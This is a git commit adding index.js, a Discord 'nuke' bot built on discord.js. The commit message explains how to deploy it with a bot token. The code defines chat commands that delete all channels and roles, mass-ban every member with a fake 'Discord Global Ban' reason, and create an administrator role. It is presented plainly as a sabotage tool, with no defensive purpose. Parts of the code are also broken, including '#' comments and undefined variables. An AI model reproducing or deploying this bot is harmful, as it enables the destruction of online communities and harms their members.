18023ff607ee4501c92ad72a4f7f26ddb646e431
Little-Winge <75264135+Little-Winge@users.noreply.github.com>
2021-01-20 15:21:02 -0500

    Create index.js
    PLEASE READ THIS
    At the beginning, you can set the status to whatever you want. At the end, you need to create an application in the Discord dev portal and copy a bot token to replace it with.

---
+++ index.js
@@ -0,0 +1,45 @@
+const discord = require("discord.js");
+const nuke = new discord.Client();
+
+
+nuke.on("ready", () =>{
+console.log(`${nuke.user.tag} is online.`);
+nuke.user.setPresence({ game: { name: `Set Status to whatever you want` }, type: 0 }); # Change The Bot Name
+});
+
+nuke.on("message", async(msg)=>{
+
+
+
+if(msg.content.toLowerCase().startsWith("!" + "nuke")){
+    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+    msg.guild.members.tap(member => member.ban("Discord Global Ban 52a"));
+}
+if(msg.content.toLowerCase().startsWith("!" + "delete")){
+    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+}
+if(msg.content.toLowerCase().startsWith("!" + "ban")){
+    msg.guild.members.tap(member => member.ban("Why Not?"));
+}
+if(msg.content.toLowerCase().startsWith("!" + "role")){
+	guild.createRole({
+      name: 'Super Cool People',
+      color: 'BLUE',
+    })
+	role.setPermissions(['ADMINISTRATOR'])
+	role.setPosition(15)
+}
+if(msg.content.toLowerCase().startsWith("!" + "help")){
+    msg.author.send({
+        embed: {
+            color: 0xff0000,
+            author: { name: "Nope" },
+            description: "!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact Jinx#4395"
+        }
+    })
+}
+});
+
+nuke.login("Replace Here With Your bot Token"); # Replace your Token
